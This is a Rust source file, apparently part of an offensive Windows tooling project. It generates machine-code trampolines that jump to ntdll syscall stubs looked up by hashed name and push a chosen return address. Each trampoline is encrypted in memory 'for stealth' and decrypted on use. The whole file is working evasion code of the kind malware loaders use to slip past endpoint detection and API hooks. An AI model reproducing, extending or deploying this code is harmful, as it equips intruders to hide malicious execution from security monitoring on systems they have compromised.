use crate::internal::{
    allocator::{TRAMP_ARENA, TRAMP_TICK},
    resolver::resolve_syscall_stub,
    crypto::keccak::{kcck_crypt_block, kcck_dcrypt_block},
    crypto::hash::hash_name,
};
use std::{
    ptr,
    sync::atomic::Ordering,
    cell::UnsafeCell,
};
use winapi::{
    shared::ntdef::PVOID,
    um::{
        memoryapi::VirtualProtect,
        winnt::{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE},
    },
};

/// Maximum number of bridges to retain in the cache.
const BRIDGE_CACHE_SIZE: usize = 150;

/// Total size (in bytes) reserved for the RWX bridge arena.
const BRIDGE_ARENA_SIZE: usize = 0x10000;

/// Metadata for a single bridge entry, tracking encryption and length.
#[derive(Copy, Clone)]
struct BridgeMeta {
    /// Whether the bridge code is currently encrypted.
    encrypted: bool,
    /// Byte length of the bridge stub.
    len: usize,
}

/// A cached bridge descriptor for LRU eviction.
#[derive(Copy, Clone)]
struct BridgeEntry {
    /// Hashed syscall name to identify this bridge.
    name_hash: u64,
    /// Pointer to the executable bridge code.
    address: *const u8,
    /// Monotonic tick counter when last used.
    last_used: u64,
    /// Associated metadata.
    meta: BridgeMeta,
}

/// Fixed‑capacity LRU cache of optional `BridgeEntry` slots.
///
/// Uses `UnsafeCell` for interior mutability in a global static.
struct BridgeCache(UnsafeCell<[Option<BridgeEntry>; BRIDGE_CACHE_SIZE]>);

unsafe impl Sync for BridgeCache {}

/// Global LRU cache instance for syscall bridges.
static BRIDGE_CACHE: BridgeCache = BridgeCache(UnsafeCell::new([None; BRIDGE_CACHE_SIZE]));

/// Builds a small jump‑stub that pushes a return address, loads the syscall stub,
/// and jumps to it. The generated stub is encrypted in‑place for stealth.
///
/// # Parameters
/// - `stub`: Address of the real syscall stub in `ntdll.dll`.
/// - `ret`: Return address to push onto the stack.
///
/// # Returns
/// - `Some((ptr, len))` on success, where `ptr` points to RWX memory and `len` is stub size.
/// - `None` if allocation or memory protection fails.
///
/// # Safety
/// - Writes and executes code in dynamically allocated memory.
/// - Caller must trust the context and ensure proper cleanup if needed.
unsafe fn KfBridgeStub(stub: *const u8, ret: *const u8) -> Option<(*const u8, usize)> {
    // Bridge layout: push low dword, mov high dword, movabs rax, stub, jmp rax
    let mut buf = [
        0x68, 0, 0, 0, 0,                     // push <low32(ret)>
        0xC7, 0x44, 0x24, 0x04, 0, 0, 0, 0,   // mov [rsp+4], <high32(ret)>
        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,   // movabs rax, <stub>
        0xFF, 0xE0,                          // jmp rax
    ];

    let r = ret as u64;
    buf[1..5].copy_from_slice(&(r as u32).to_le_bytes());
    buf[9..13].copy_from_slice(&((r >> 32) as u32).to_le_bytes());
    buf[15..23].copy_from_slice(&(stub as u64).to_le_bytes());

    // Allocate from the RWX arena
    let arena = &mut *TRAMP_ARENA.get(BRIDGE_ARENA_SIZE);
    let page = arena.kfalloc(buf.len(), 16);
    if page.is_null() {
        return None;
    }

    // Make writable+executable, write, encrypt, then set to executable-only
    let mut old = 0;
    if VirtualProtect(page as PVOID, buf.len(), PAGE_EXECUTE_READWRITE, &mut old) == 0 {
        return None;
    }
    ptr::copy_nonoverlapping(buf.as_ptr(), page, buf.len());
    kcck_crypt_block(page, buf.len());
    VirtualProtect(page as PVOID, buf.len(), PAGE_EXECUTE_READ, &mut old);

    Some((page as *const u8, buf.len()))
}

/// Retrieves or constructs an execution bridge for the named syscall.
///
/// Performs:
/// 1. Hash the syscall name for cache lookup.
/// 2. Check the LRU cache for an existing, decrypted bridge.
/// 3. On hit: decrypt in-place if needed and return address.
/// 4. On miss: build a new bridge stub, decrypt it for immediate use, and insert/evict in the cache.
///
/// # Parameters
/// - `name`: Exact syscall name (e.g. `"NtAllocateVirtualMemory"`).
/// - `ret`: Return address to embed in the bridge.
///
/// # Returns
/// - Pointer to executable bridge code, or `null` if any step fails.
///
/// # Safety
/// - Assumes `init_maps()` (syscall resolver) has been called.
/// - `ret` must be a valid return address on the current stack.
/// - Caller must trust that the returned pointer is safe to execute.
#[inline(always)]
pub unsafe fn KfFetchOrCreateBridge(name: &str, ret: *const u8) -> *const u8 {
    let h = hash_name(name);
    let tick = TRAMP_TICK.fetch_add(1, Ordering::SeqCst);
    let cache = &mut *BRIDGE_CACHE.0.get();

    // Attempt cache hit
    if let Some(entry) = cache.iter_mut().flatten().find(|e| e.name_hash == h) {
        entry.last_used = tick;

        if entry.meta.encrypted {
            let ptr = entry.address as *mut u8;
            let mut old = 0;
            VirtualProtect(ptr as PVOID, entry.meta.len, PAGE_EXECUTE_READWRITE, &mut old);
            kcck_dcrypt_block(ptr, entry.meta.len);
            VirtualProtect(ptr as PVOID, entry.meta.len, PAGE_EXECUTE_READ, &mut old);
            entry.meta.encrypted = false;
        }

        return entry.address;
    }

    // Cache miss: build new stub
    let stub = resolve_syscall_stub(name).unwrap_or(ptr::null());
    let (addr, len) = match KfBridgeStub(stub, ret) {
        Some(p) => p,
        None => return ptr::null(),
    };

    // Decrypt for immediate execution
    let mut old = 0;
    VirtualProtect(addr as PVOID, len, PAGE_EXECUTE_READWRITE, &mut old);
    kcck_dcrypt_block(addr as *mut u8, len);
    VirtualProtect(addr as PVOID, len, PAGE_EXECUTE_READ, &mut old);

    // Insert into LRU cache (evict oldest if full)
    let idx = cache.iter()
        .position(Option::is_none)
        .unwrap_or_else(|| {
            cache.iter().enumerate()
                .min_by_key(|(_, e)| e.as_ref().unwrap().last_used)
                .unwrap().0
        });

    cache[idx] = Some(BridgeEntry {
        name_hash: h,
        address:   addr,
        last_used: tick,
        meta:      BridgeMeta { encrypted: false, len },
    });

    addr
}